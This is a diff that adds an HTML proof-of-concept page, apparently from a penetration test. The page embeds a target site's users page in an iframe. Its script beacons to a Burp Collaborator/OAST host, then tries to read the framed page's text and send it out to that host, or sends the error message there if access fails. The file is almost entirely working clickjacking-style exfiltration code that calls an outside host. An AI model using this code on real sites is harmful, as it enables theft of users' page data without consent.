@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>PoC</title>
+</head>
+<body>
+<h2>Iframe Injection PoC</h2>
+
+<iframe id="if1"
+        src="https://pentests-test.scilife.io/en/users"
+        width="100%"
+        height="800"></iframe>
+
+<script>
+// Replace with your Burp Collaborator ID
+var collab = "https://d4jugaen1od0d3u1lmfgvkpmmbrjevqig.oast.pro/?status=";
+
+// Confirm that victim loads embedded page
+fetch(collab + "iframe_loaded");
+
+// Try extracting content if same-origin or misconfigured CORS
+setTimeout(() => {
+    try {
+        let txt = document.getElementById("if1")
+                   .contentWindow.document.body.innerText;
+
+        fetch(collab + encodeURIComponent(txt)); // exfil
+    } catch(e) {
+        fetch(collab + "dom_access_failed_" + encodeURIComponent(e.toString()));
+    }
+}, 4000);
+</script>
+</body>
+</html>
